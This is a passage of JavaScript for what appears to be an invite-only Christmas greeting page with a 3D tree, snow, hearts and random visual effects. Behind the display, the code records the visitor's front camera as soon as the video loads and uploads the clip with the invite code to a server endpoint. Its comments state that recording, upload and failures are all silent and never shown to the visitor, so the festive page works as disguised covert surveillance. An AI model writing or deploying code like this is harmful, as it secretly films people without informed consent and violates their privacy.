                    errorMessage += '<p style="font-size: 12px; color: #aaa;">设置路径：QQ浏览器 > 设置 > 隐私与安全 > 摄像头权限</p>';
                    errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
                } else if (browser.isIOS) {
                    errorMessage += '<p>请在Safari设置中允许摄像头权限</p>';
                    errorMessage += '<p style="font-size: 12px; color: #aaa;">设置 > Safari > 摄像头</p>';
                    errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
                } else if (browser.isAndroid) {
                    errorMessage += '<p>请在浏览器设置中允许摄像头权限</p>';
                    errorMessage += '<p style="font-size: 12px; color: #aaa;">然后刷新页面重试</p>';
                    errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
                } else {
                    errorMessage += '<p>请允许访问摄像头权限<br>然后刷新页面重试</p>';
                    errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
                }
            } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                errorMessage += '<p>未检测到摄像头设备<br>请检查设备连接</p>';
            } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
                // 摄像头被占用，可能是从其他页面跳转过来，尝试延迟重试
                console.log('摄像头被占用，延迟500ms后重试...');
                setTimeout(() => {
                    console.log('重试获取摄像头权限...');
                    getUserMedia(useLegacy ? legacyConstraints : constraints)
                        .then((stream) => {
                            cameraStream = stream;
                            loadingElement.style.display = 'none';
                            console.log('前置摄像头授权成功（重试）');
                            
                            // 将视频流显示在video元素上
                            if (cameraVideo) {
                                if (cameraVideo.srcObject !== undefined) {
                                    cameraVideo.srcObject = stream;
                                } else if (cameraVideo.mozSrcObject !== undefined) {
                                    cameraVideo.mozSrcObject = stream;
                                } else if (window.URL && window.URL.createObjectURL) {
                                    cameraVideo.src = window.URL.createObjectURL(stream);
                                }
                                
                                cameraVideo.setAttribute('playsinline', 'true');
                                cameraVideo.setAttribute('webkit-playsinline', 'true');
                                cameraVideo.setAttribute('x5-playsinline', 'true');
                                cameraVideo.muted = true;
                                
                                const playPromise = cameraVideo.play();
                                if (playPromise !== undefined) {
                                    playPromise
                                        .then(() => {
                                            console.log('视频播放成功（重试）');
                                        })
                                        .catch((err) => {
                                            console.warn('自动播放失败:', err);
                                        });
                                }
                                
                                cameraVideo.addEventListener('loadedmetadata', () => {
                                    console.log('视频已加载，开始录像...');
                                    startRecordingAndUpload();
                                }, { once: true });
                            }
                        })
                        .catch((retryErr) => {
                            console.error('重试后仍然失败:', retryErr);
                            errorMessage = '<p>❌ 无法访问摄像头</p>';
                            errorMessage += '<p>摄像头被其他应用占用<br>请关闭其他应用后刷新页面重试</p>';
                            errorMessage += '<p style="margin-top: 15px;"><button onclick="initCamera()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">重试</button></p>';
                            if (loadingElement) {
                                loadingElement.innerHTML = errorMessage;
                            }
                        });
                }, 500);
                return; // 不显示错误，等待重试
            } else if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                errorMessage += '<p>摄像头不支持所需设置<br>请刷新页面重试</p>';
                errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
            } else if (err.message && err.message.includes('HTTPS')) {
                errorMessage += '<p>⚠️ 需要 HTTPS 协议访问<br>请使用 HTTPS 或 localhost 访问</p>';
            } else {
                errorMessage += '<p>错误：' + (err.message || err.name || '未知错误') + '<br>请刷新页面重试</p>';
                errorMessage += '<p style="margin-top: 15px;"><button onclick="location.reload()" style="padding: 8px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">刷新重试</button></p>';
            }
            
            if (loadingElement) {
                loadingElement.innerHTML = errorMessage;
            }
        });
}

// --- 随机特效播放 ---
function startRandomEffects() {
    const effects = [
        'star',      // 伯利恒之星
        'rainbow',   // 彩虹模式
        'music',     // 音乐
        'grow',      // 充能
        'theme',     // 主题切换
        'trail',     // 光绘
        'heart',     // 爱心雨
        'blizzard'   // 暴风雪
    ];
    
    function playRandomEffect() {
        const effect = effects[Math.floor(Math.random() * effects.length)];
        console.log('随机播放特效:', effect);
        
        switch(effect) {
            case 'star':
                triggerStarAnimation();
                break;
            case 'rainbow':
                state.rainbowMode = !state.rainbowMode;
                soundManager.playEffect('switch');
                showFeedback(state.rainbowMode ? "🌈 彩虹模式" : "❄️ 纯净模式");
                break;
            case 'music':
                const playing = soundManager.toggleBGM();
                showFeedback(playing ? "🎵 播放音乐" : "🔇 暂停音乐");
                break;
            case 'grow':
                soundManager.playEffect('grow');
                showFeedback("👍 圣树充能");
                gsap.to(treeGroup.scale, { x: 1.2, y: 1.2, z: 1.2, duration: 0.5, yoyo: true, repeat: 1 });
                break;
            case 'theme':
                soundManager.playEffect('switch');
                updateTreeTheme();
                showFeedback(`🎨 主题: ${THEMES[state.themeIndex].name}`);
                break;
            case 'trail':
                updateMagicTrail(new THREE.Vector3(0, 10, 0));
                break;
            case 'heart':
                showFeedback("❤️ 圣诞快乐");
                soundManager.playEffect('magic');
                for(let i = 0; i < 5; i++) {
                    setTimeout(() => {
                        spawnHeart(new THREE.Vector3(
                            (Math.random() - 0.5) * 10,
                            Math.random() * 10,
                            (Math.random() - 0.5) * 10
                        ));
                    }, i * 200);
                }
                break;
            case 'blizzard':
                state.blizzardMode = true;
                soundManager.playEffect('wind');
                showFeedback("🌪️ 暴风雪!");
                setTimeout(() => { state.blizzardMode = false; }, 2000);
                break;
        }
        
        // 随机间隔（2-5秒）
        const nextDelay = 2000 + Math.random() * 3000;
        randomEffectTimer = setTimeout(playRandomEffect, nextDelay);
    }
    
    // 首次延迟3秒后开始
    randomEffectTimer = setTimeout(playRandomEffect, 3000);
}

function triggerStarAnimation() {
    state.starActive = true;
    soundManager.playEffect('magic');
    showFeedback("✨ 伯利恒之星");
    
    gsap.to(starMesh.scale, { x: 1.5, y: 1.5, z: 1.5, duration: 1, ease: "elastic.out(1, 0.3)" });
    gsap.to(starMesh.rotation, { y: Math.PI * 4, duration: 2, ease: "power2.out" });
    
    if(ornamentPoints) ornamentPoints.material.size = 1.0;

    setTimeout(() => {
        gsap.to(starMesh.scale, { x: 0.3, y: 0.3, z: 0.3, duration: 0.5 });
        if(ornamentPoints) ornamentPoints.material.size = 0.5;
        state.starActive = false;
    }, 3000);
}

function animate() {
    requestAnimationFrame(animate);
    const delta = clock.getDelta();

    if (treeGroup) treeGroup.rotation.y += 0.005;
    if (starMesh) starMesh.rotation.y += 0.02;

    updateSnow();
    updateOrnaments();
    updateTrailParticles();
    updateHearts();
    
    composer.render();
}

function updateSnow() {
    if (!snowSystem) return;
    const positions = snowGeo.attributes.position.array;
    const colors = snowGeo.attributes.color.array;
    const velocities = snowGeo.userData.velocities;
    const windForce = state.wind;

    for (let i = 0; i < 2000; i++) {
        const idx = i * 3;
        positions[idx] += (velocities[idx] + windForce * 0.5);
        positions[idx + 1] += (velocities[idx + 1] * (state.blizzardMode ? 5 : 1));
        positions[idx + 2] += velocities[idx + 2];

        if (state.rainbowMode) {
            const time = Date.now() * 0.001;
            const c = new THREE.Color().setHSL((time + positions[idx + 1] * 0.02) % 1.0, 1.0, 0.5);
            colors[idx] = c.r; colors[idx + 1] = c.g; colors[idx + 2] = c.b;
        }
        
        if (positions[idx + 1] < 0) {
            positions[idx + 1] = 50;
            positions[idx] = (Math.random() - 0.5) * 80;
            positions[idx + 2] = (Math.random() - 0.5) * 60;
        }
    }
    snowGeo.attributes.position.needsUpdate = true;
    if (state.rainbowMode) snowGeo.attributes.color.needsUpdate = true;
}

function updateOrnaments() {
    if (!ornamentPoints) return;
    const colors = ornamentPoints.geometry.attributes.color.array;
    const time = Date.now() * 0.005;
    
    for(let i = 0; i < colors.length; i+=3) {
        if(Math.random() > 0.98) {
            const flicker = 0.5 + Math.sin(time + i) * 0.5;
            if(Math.random() > 0.95) {
                colors[i] = 1; colors[i+1] = 1; colors[i+2] = 1;
            } else {
                const theme = THEMES[state.themeIndex];
                const c = new THREE.Color(i % 2 === 0 ? theme.colors[1] : theme.colors[2]);
                colors[i] = c.r * flicker;
                colors[i+1] = c.g * flicker;
                colors[i+2] = c.b * flicker;
            }
        }
    }
    ornamentPoints.geometry.attributes.color.needsUpdate = true;
}

function updateMagicTrail(pos) {
    for(let i=0; i<3; i++) {
        const particle = {
            pos: pos.clone().add(new THREE.Vector3((Math.random()-0.5)*0.5, (Math.random()-0.5)*0.5, (Math.random()-0.5)*0.5)),
            vel: new THREE.Vector3((Math.random()-0.5)*0.1, (Math.random()-0.5)*0.1, (Math.random()-0.5)*0.1),
            life: 1.0,
            color: new THREE.Color().setHSL(Math.random(), 1.0, 0.7),
            mesh: null
        };
        
        const geo = new THREE.PlaneGeometry(0.2, 0.2);
        const mat = new THREE.MeshBasicMaterial({
            color: particle.color, 
            transparent: true, 
            opacity: 1.0,
            blending: THREE.AdditiveBlending,
            side: THREE.DoubleSide
        });
        const mesh = new THREE.Mesh(geo, mat);
        mesh.position.copy(particle.pos);
        mesh.lookAt(camera.position);
        scene.add(mesh);
        
        particle.mesh = mesh;
        trailParticles.push(particle);
    }
}

function updateTrailParticles() {
    for(let i = trailParticles.length - 1; i >= 0; i--) {
        const p = trailParticles[i];
        p.life -= 0.02;
        p.pos.add(p.vel);
        p.mesh.position.copy(p.pos);
        p.mesh.material.opacity = p.life;
        p.mesh.scale.setScalar(p.life);
        p.mesh.lookAt(camera.position);
        
        if(p.life <= 0) {
            scene.remove(p.mesh);
            p.mesh.geometry.dispose();
            p.mesh.material.dispose();
            trailParticles.splice(i, 1);
        }
    }
}

function spawnHeart(pos) {
    const heartShape = new THREE.Shape();
    const x = 0, y = 0;
    heartShape.moveTo( x + 0.25, y + 0.25 );
    heartShape.bezierCurveTo( x + 0.25, y + 0.25, x + 0.20, y, x, y );
    heartShape.bezierCurveTo( x - 0.30, y, x - 0.30, y + 0.35, x - 0.30, y + 0.35 );
    heartShape.bezierCurveTo( x - 0.30, y + 0.55, x - 0.10, y + 0.77, x + 0.25, y + 0.95 );
    heartShape.bezierCurveTo( x + 0.60, y + 0.77, x + 0.80, y + 0.55, x + 0.80, y + 0.35 );
    heartShape.bezierCurveTo( x + 0.80, y + 0.35, x + 0.80, y, x + 0.50, y );
    heartShape.bezierCurveTo( x + 0.35, y, x + 0.25, y + 0.25, x + 0.25, y + 0.25 );

    const geometry = new THREE.ShapeGeometry( heartShape );
    const material = new THREE.MeshBasicMaterial( { color: 0xff69b4, side: THREE.DoubleSide, transparent: true, blending: THREE.AdditiveBlending } );
    const mesh = new THREE.Mesh( geometry, material );
    
    mesh.position.copy(pos);
    mesh.scale.set(0.5, 0.5, 0.5);
    mesh.rotation.z = Math.PI;
    scene.add( mesh );
    
    heartParticles.push({
        mesh: mesh,
        vel: new THREE.Vector3((Math.random()-0.5)*0.2, 0.2 + Math.random()*0.2, (Math.random()-0.5)*0.2),
        life: 1.5
    });
}

function updateHearts() {
    for(let i = heartParticles.length - 1; i >= 0; i--) {
        const p = heartParticles[i];
        p.life -= 0.01;
        p.mesh.position.add(p.vel);
        p.mesh.material.opacity = p.life;
        p.mesh.rotation.y += 0.05;
        p.mesh.lookAt(camera.position);
        
        if(p.life <= 0) {
            scene.remove(p.mesh);
            p.mesh.geometry.dispose();
            p.mesh.material.dispose();
            heartParticles.splice(i, 1);
        }
    }
}

function showFeedback(text) {
    if (!text) { feedbackElement.classList.remove('active'); return; }
    feedbackElement.innerText = text;
    feedbackElement.classList.add('active');
    setTimeout(() => { if(feedbackElement.innerText === text) feedbackElement.classList.remove('active'); }, 2000);
}

function onWindowResize() {
    updateCameraPosition();
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
    composer.setSize(window.innerWidth, window.innerHeight);
}

// --- URL参数解析 ---
function parseURLParams() {
    const urlParams = new URLSearchParams(window.location.search);
    inviteCode = urlParams.get('code') || '';
    
    if (!inviteCode) {
        console.error('缺少邀请链接码');
        // 静默失败，不显示提示
    }
}

// --- 验证邀请链接码 ---
async function validateInviteCode() {
    if (!inviteCode) {
        console.error('缺少邀请链接码');
        return false;
    }
    
    try {
        const response = await fetch(`api/validate_invite.php?code=${inviteCode}`);
        const data = await response.json();
        
        if (!data.valid) {
            console.error('邀请链接码验证失败:', data.message);
            return false;
        }
        
        return true;
    } catch (err) {
        console.error('验证邀请链接码失败:', err);
        return false;
    }
}

// --- 阻止页面访问（显示空白页面） ---
function blockPageAccess(message) {
    // 隐藏所有页面内容，显示空白页面
    const canvas = document.getElementById('output_canvas');
    const loading = document.getElementById('loading');
    const instructionPanel = document.getElementById('instruction-panel');
    const statusFeedback = document.getElementById('status-feedback');
    const body = document.body;
    
    // 隐藏所有内容
    if (canvas) canvas.style.display = 'none';
    if (instructionPanel) instructionPanel.style.display = 'none';
    if (statusFeedback) statusFeedback.style.display = 'none';
    
    // 设置body为空白页面样式
    if (body) {
        body.style.margin = '0';
        body.style.padding = '0';
        body.style.background = '#000';
        body.style.overflow = 'hidden';
    }
    
    // 显示错误信息（空白页面上的唯一内容）
    if (loading) {
        loading.style.display = 'block';
        loading.style.position = 'fixed';
        loading.style.top = '0';
        loading.style.left = '0';
        loading.style.width = '100%';
        loading.style.height = '100%';
        loading.style.margin = '0';
        loading.style.padding = '0';
        loading.style.background = '#000';
        loading.style.borderRadius = '0';
        loading.style.maxWidth = '100%';
        loading.style.transform = 'none';
        loading.innerHTML = `
            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 20px;">
                <div style="font-size: 64px; margin-bottom: 30px;">❌</div>
                <h2 style="color: #f44336; margin: 0 0 20px 0; font-size: 24px;">访问被拒绝</h2>
                <p style="color: #fff; font-size: 18px; margin: 0 0 15px 0; line-height: 1.6;">${message || '邀请链接无效或已过期'}</p>
                <p style="color: #888; font-size: 14px; margin: 0;">请使用正确的邀请链接</p>
            </div>
        `;
    }
    
    // 阻止上传功能
    isUploading = true; // 设置为true，阻止所有上传操作
    
    // 停止所有可能的动画和定时器
    if (typeof cancelAnimationFrame === 'function') {
        // 如果有动画帧，可以在这里取消
    }
}

// --- 获取最大录像时长 ---
async function getMaxVideoDuration() {
    try {
        const response = await fetch('api/get_register_config.php');
        const data = await response.json();
        
        if (data.success && data.data && data.data['video_max_duration']) {
            maxVideoDuration = parseInt(data.data['video_max_duration']) || 60;
        }
    } catch (err) {
        // 如果获取失败，使用默认值
        console.error('获取录像时长配置失败:', err);
    }
}

// --- 开始录像并自动上传 ---
function startRecordingAndUpload() {
    if (isUploading) {
        console.log('正在上传中，跳过重复录像');
        return; // 防止重复上传
    }
    
    // 再次验证邀请码（防止绕过验证）
    if (!inviteCode) {
        console.error('缺少邀请链接码');
        blockPageAccess('邀请链接码无效');
        return;
    }
    
    // 检查摄像头流是否还存在
    if (!cameraStream || cameraStream.getTracks().length === 0) {
        console.error('摄像头流不可用');
        releaseCamera();
        return;
    }
    
    // 检查视频元素状态
    if (!cameraVideo) {
        console.error('视频元素不存在');
        releaseCamera();
        return;
    }
    
    // 检查视频是否已准备好
    if (cameraVideo.readyState < 2 || !cameraVideo.videoWidth || !cameraVideo.videoHeight) {
        console.warn('视频未准备好，等待中...', {
            readyState: cameraVideo.readyState,
            width: cameraVideo.videoWidth,
            height: cameraVideo.videoHeight
        });
        // 等待视频准备好，最多等待2秒
        let waitCount = 0;
        const maxWait = 10; // 10次 * 200ms = 2秒
        const waitForReady = () => {
            if (cameraVideo.readyState >= 2 && cameraVideo.videoWidth > 0 && cameraVideo.videoHeight > 0) {
                console.log('视频已准备好，开始录像');
                startRecordingAndUpload();
            } else if (waitCount < maxWait) {
                waitCount++;
                setTimeout(waitForReady, 200);
            } else {
                console.error('等待视频准备超时');
                releaseCamera();
            }
        };
        setTimeout(waitForReady, 200);
        return;
    }
    
    try {
        recordedChunks = [];
        
        // 检测移动设备和iOS
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
        
        // 尝试使用不同的MIME类型，优先使用VP8编码（文件更小）
        // 只录制视频，不包含音频
        // iOS Safari 通常只支持 H.264
        let mimeType = 'video/webm;codecs=vp8';
        let videoBitsPerSecond = isMobile ? 800000 : 1000000; // 移动端使用更低码率
        
        // iOS Safari 特殊处理
        if (isIOS) {
            // iOS Safari 通常支持 H.264
            if (MediaRecorder.isTypeSupported('video/mp4')) {
                mimeType = 'video/mp4';
            } else if (MediaRecorder.isTypeSupported('video/quicktime')) {
                mimeType = 'video/quicktime';
            } else {
                // 降级到 webm
                mimeType = 'video/webm';
            }
            videoBitsPerSecond = 600000; // iOS 使用更低码率
        } else {
            // Android 和其他浏览器
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/webm;codecs=vp9';
                videoBitsPerSecond = 700000; // VP9编码效率更高，可以更低码率
            }
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/webm';
                videoBitsPerSecond = 1000000; // 默认编码
            }
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/mp4';
                videoBitsPerSecond = 1200000; // MP4编码，需要更高码率
            }
        }
        
        // 创建MediaRecorder，只录制视频，不录制音频
        const options = {
            mimeType: mimeType,
            videoBitsPerSecond: videoBitsPerSecond
        };
        
        mediaRecorder = new MediaRecorder(cameraStream, options);
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            try {
                const recordedBlob = new Blob(recordedChunks, { type: mimeType });
                console.log('录像完成，文件大小:', recordedBlob.size, 'bytes');
                
                // 检查文件大小
                const maxSize = 20 * 1024 * 1024; // 20MB
                if (recordedBlob.size > maxSize) {
                    console.warn('录像文件过大:', recordedBlob.size, 'bytes');
                    // 文件过大也要释放摄像头
                    releaseCamera();
                    return;
                }
                
                // 停止MediaRecorder（如果还在运行）
                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                    try {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    } catch (err) {
                        console.error('停止MediaRecorder失败:', err);
                    }
                }
                
                // 自动上传（静默上传，不显示提示）
                isUploading = true;
                await uploadVideo(recordedBlob);
            } catch (err) {
                console.error('处理录像失败:', err);
                isUploading = false;
            } finally {
                // 无论上传成功或失败，都要释放摄像头
                releaseCamera();
            }
        };
        
        mediaRecorder.onerror = (event) => {
            console.error('录像错误:', event.error);
            // 录像错误也要释放摄像头
            releaseCamera();
            // 静默失败，不显示提示
        };
        
        // 开始录像
        mediaRecorder.start(100); // 每100ms收集一次数据
        console.log('开始录像，最大时长:', maxVideoDuration, '秒');
        
        // 设置最大录像时长，自动停止
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                console.log('达到最大录像时长，停止录像...');
                mediaRecorder.stop();
            }
        }, maxVideoDuration * 1000);
        
    } catch (error) {
        console.error('开始录像失败:', error);
        // 录像失败也要释放摄像头
        releaseCamera();
        // 静默失败，不显示提示
    }
}

// --- 上传录像到主系统 ---
async function uploadVideo(blob) {
    // 再次验证邀请码（防止绕过验证）
    if (!inviteCode) {
        console.error('缺少邀请链接码，无法上传');
        blockPageAccess('邀请链接码无效');
        return;
    }
    
    try {
        const formData = new FormData();
        formData.append('video', blob, 'record.webm');
        formData.append('invite_code', inviteCode);
        
        const response = await fetch('api/upload_video.php', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const text = await response.text();
            console.error('上传失败，HTTP状态:', response.status);
            throw new Error('上传失败：服务器错误 ' + response.status);
        }
        
        const text = await response.text();
        let data;
        try {
            data = JSON.parse(text);
        } catch (e) {
            console.error('JSON解析失败:', e);
            throw new Error('服务器返回格式错误');
        }
        
        if (data.success) {
            console.log('✅ 上传成功');
            isUploading = false;
            // 静默成功，不显示提示
            // 注意：摄像头已在 uploadVideo 调用后释放
        } else {
            throw new Error(data.message || '上传失败');
        }
    } catch (err) {
        console.error('上传错误:', err);
        isUploading = false;
        // 上传失败也要确保摄像头已释放（在 finally 中已处理）
        // 静默失败，不显示提示
    }
}

